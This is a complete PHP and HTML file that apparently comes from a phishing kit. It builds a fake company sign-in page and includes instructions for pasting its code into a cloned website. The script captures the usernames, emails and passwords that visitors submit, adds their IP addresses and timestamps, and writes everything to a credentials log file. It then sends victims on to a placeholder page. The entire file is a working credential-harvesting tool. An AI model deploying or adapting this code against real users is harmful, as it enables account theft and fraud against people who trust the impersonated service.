<?php
// requires PHP v4.0.0 or greater

// copy and paste this whole PHP code block at the beginning of a cloned web page

// prevent caching
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Cache-Control: post-check=0, pre-check=0', false);
header('Pragma: no-cache');
header('Expires: 0');

// this is where your form data gets submitted to
if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'post') {

    $limit = 100;
    // basic flood protection
    // each form input should have no more than $limit characters

    $parameters = array();

    if (isset($_POST['username'])) {
        $_POST['username'] = trim($_POST['username']);
        if (strlen($_POST['username']) >= 1 && strlen($_POST['username']) <= $limit) {
            $parameters['username'] = $_POST['username'];
        }
    }
    if (isset($_POST['email'])) {
        $_POST['email'] = trim($_POST['email']);
        if (strlen($_POST['email']) >= 1 && strlen($_POST['email']) <= $limit) {
            $parameters['email'] = $_POST['email'];
        }
    }
    if (isset($_POST['password'])) {
        if (strlen($_POST['password']) >= 1 && strlen($_POST['password']) <= $limit) {
            $parameters['password'] = $_POST['password'];
        }
    }
    if ((isset($parameters['username']) || isset($parameters['email'])) && isset($parameters['password'])) {

        $parameters['ip'] = $_SERVER['REMOTE_ADDR'];
        $parameters['datetime'] = date('Y-m-d H:i:s', time());

        // write JSON string to a file
        $string = json_encode($parameters) . "\n";

        if (!file_exists('./logs/')) {
            mkdir('./logs/');
        }
        file_put_contents('./logs/credentials.log', $string, FILE_APPEND | LOCK_EX);

        // redirect the user after a successful sign in
        header('Location: ./redirects/coming_soon.php');
        // header('Location: ./redirects/downloads.php');
    }
}
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<!-- change title to your liking -->
		<title>Company&#8482; | Sign In</title>
		<meta name="author" content="Ivan Šincek">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="stylesheet" href="./css/main.css" hreflang="en" type="text/css" media="all">
	</head>
	<body class="background-img">
		<div class="front-form">
			<div class="layout">
				<div class="logo">
					<img src="./img/logo.png" alt="Logo">
				</div>
				<!-- change headers to your liking -->
				<header>
					<h1 class="title">Company&#8482;</h1>
					<h1 class="subtitle">Sign In</h1>
				</header>
				<!-- copy and paste this form attributes to the cloned web page form -->
				<form method="post" action="<?php echo './' . basename($_SERVER['SCRIPT_FILENAME']); ?>">
					<!-- make sure to correctly modify form input fields on the cloned web page -->
					<!-- because backend will only accept "username", "email", and "password" input fields -->
					<input name="username" id="username" type="text" spellcheck="false" placeholder="Username" required="required">
					<!-- <input name="email" id="email" type="text" spellcheck="false" placeholder="Email" required="required"> -->
					<!-- you can add your own regular expression attribute in the email input field to limit the scope -->
					<!-- pattern="^[^\s]+@company\.com$" -->
					<!-- or you can use the universal one -->
					<!-- pattern="^(([^<>()\[\]\\.,;:\s@\u0022]+(\.[^<>()\[\]\\.,;:\s@\u0022]+)*)|(\u0022.+\u0022))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$" -->
					<input name="password" id="password" type="password" placeholder="Password" required="required">
					<input type="submit" value="Sign In">
				</form>
			</div>
		</div>
	</body>
</html>
